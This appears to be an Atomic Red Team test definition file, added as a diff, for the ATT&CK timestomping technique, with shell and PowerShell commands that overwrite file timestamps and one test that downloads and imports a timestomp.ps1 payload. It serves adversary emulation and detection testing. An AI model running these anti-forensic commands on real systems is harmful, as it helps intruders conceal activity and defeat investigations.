@@ -1,0 +1,199 @@
+attack_technique:
+- T1551.006
+display_name: Timestomp
+atomic_tests:
+- name: Set a file's access timestamp
+  description: |
+    Stomps on the access timestamp of a file
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    target_filename:
+      description: Path of file that we are going to stomp on last access time
+      type: Path
+      default: /opt/filename
+  executor:
+    command: |
+      touch -a -t 197001010000.00 #{target_filename}
+    name: sh
+- name: Set a file's modification timestamp
+  description: |
+    Stomps on the modification timestamp of a file
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    target_filename:
+      description: Path of file that we are going to stomp on last access time
+      type: Path
+      default: /opt/filename
+  executor:
+    command: |
+      touch -m -t 197001010000.00 #{target_filename}
+    name: sh
+- name: Set a file's creation timestamp
+  description: |
+    Stomps on the create timestamp of a file
+
+    Setting the creation timestamp requires changing the system clock and reverting.
+    Sudo or root privileges are required to change date. Use with caution.
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    target_filename:
+      description: Path of file that we are going to stomp on last access time
+      type: Path
+      default: /opt/filename
+  executor:
+    command: |
+      NOW=$(date)
+      date -s "1970-01-01 00:00:00"
+      touch #{target_filename}
+      date -s "$NOW"
+      stat #{target_filename}
+    name: sh
+- name: Modify file timestamps using reference file
+  description: |
+    Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.
+
+    This technique was used by the threat actor Rocke during the compromise of Linux web servers.
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    target_file_path:
+      description: Path of file to modify timestamps of
+      type: Path
+      default: /opt/filename
+    reference_file_path:
+      description: Path of reference file to read timestamps from
+      type: Path
+      default: /bin/sh
+  executor:
+    command: |
+      touch -acmr #{reference_file_path} #{target_file_path}
+    name: sh
+- name: Windows - Modify file creation timestamp with PowerShell
+  description: |
+    Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+    To verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_date_time:
+      description: Date/time to replace original timestamps with
+      type: String
+      default: 01/01/1970 00:00:00
+    file_path:
+      description: Path of file to change creation timestamp
+      type: Path
+      default: $env:TEMP\T1099_timestomp.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      A file must exist at the path (#{file_path}) to change the creation time on
+    prereq_command: |
+      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Path #{file_path} -Force | Out-Null
+      Set-Content #{file_path} -Value "T1099 Timestomp" -Force | Out-Null
+  executor:
+    command: |
+      Get-ChildItem #{file_path} | % { $_.CreationTime = "#{target_date_time}" }
+    cleanup_command: |
+      Remove-Item #{file_path} -Force -ErrorAction Ignore
+    name: powershell
+- name: Windows - Modify file last modified timestamp with PowerShell
+  description: |
+    Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+    To verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_date_time:
+      description: Date/time to replace original timestamps with
+      type: String
+      default: 01/01/1970 00:00:00
+    file_path:
+      description: Path of file to change modified timestamp
+      type: Path
+      default: $env:TEMP\T1099_timestomp.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      A file must exist at the path (#{file_path}) to change the modified time on
+    prereq_command: |
+      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Path #{file_path} -Force | Out-Null
+      Set-Content #{file_path} -Value "T1099 Timestomp" -Force | Out-Null
+  executor:
+    command: |
+      Get-ChildItem #{file_path} | % { $_.LastWriteTime = "#{target_date_time}" }
+    cleanup_command: |
+      Remove-Item #{file_path} -Force -ErrorAction Ignore
+    name: powershell
+- name: Windows - Modify file last access timestamp with PowerShell
+  description: |
+    Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.
+    To verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_date_time:
+      description: Date/time to replace original timestamps with
+      type: String
+      default: 01/01/1970 00:00:00
+    file_path:
+      description: Path of file to change last access timestamp
+      type: Path
+      default: $env:TEMP\T1099_timestomp.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      A file must exist at the path (#{file_path}) to change the last access time on
+    prereq_command: |
+      if (Test-Path #{file_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Path #{file_path} -Force | Out-Null
+      Set-Content #{file_path} -Value "T1099 Timestomp" -Force | Out-Null
+  executor:
+    command: |
+      Get-ChildItem #{file_path} | % { $_.LastAccessTime = "#{target_date_time}" }
+    cleanup_command: |
+      Remove-Item #{file_path} -Force -ErrorAction Ignore
+    name: powershell
+- name: Windows - Timestomp a File
+  description: "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n"
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: File path for timestomp payload
+      type: String
+      default: $env:appdata\Microsoft
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      timestomp.ps1 must be present in #{file_path}.
+    prereq_command: |
+      if (Test-Path #{file_path}\timestomp.ps1) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1"
+  - description: |
+      kxwn.lock must be present in #{file_path}.
+    prereq_command: |
+      if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Path #{file_path}\kxwn.lock -ItemType File
+  executor:
+    command: "import-module #{file_path}\\timestomp.ps1\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n \n"
+    cleanup_command: |-
+      Write-Host "Removing #{file_path}\timestomp.ps1"
+      Remove-Item #{file_path}\timestomp.ps1 -ErrorAction Ignore
+      Write-Host "Removing #{file_path}\kxwn.lock"
+      Remove-Item #{file_path}\kxwn.lock -ErrorAction Ignore
+    name: powershell
+
